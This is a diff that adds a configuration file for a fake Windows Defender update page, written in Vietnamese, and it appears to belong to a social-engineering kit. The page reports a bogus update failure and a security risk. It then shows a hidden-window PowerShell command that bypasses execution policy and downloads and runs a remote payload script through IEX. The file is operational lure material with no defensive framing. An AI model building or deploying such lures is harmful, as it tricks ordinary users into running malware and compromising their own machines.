@@ -1,0 +1,24 @@
+# Fake Update Lure (alias of software_update)
+# Same Windows Update style but with different error message
+
+type: update_error
+template: lures/software_update.html
+route: /cap-nhat-defender
+
+payload:
+  script: "default.js"
+
+content:
+  title: "Cập nhật Định nghĩa Windows Defender — KB5034441"
+  version: "Định nghĩa 1.411.35.0 · 124 MB"
+  description: "Cập nhật định nghĩa chống virus quan trọng để bảo vệ hệ thống của bạn."
+  error_title: "Cập Nhật Thất Bại — Rủi Ro Bảo Mật"
+  error_message: >
+    Không thể áp dụng bản cập nhật định nghĩa Windows Defender.
+    Hệ thống của bạn có thể bị tấn công cho đến khi cài đặt bản cập nhật này.
+  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/default.ps1' -UseBasicParsing).Content\""
+
+styles:
+  theme: "windows"
+  primary_color: "#0078d4"
+  error_color: "#d83b01"
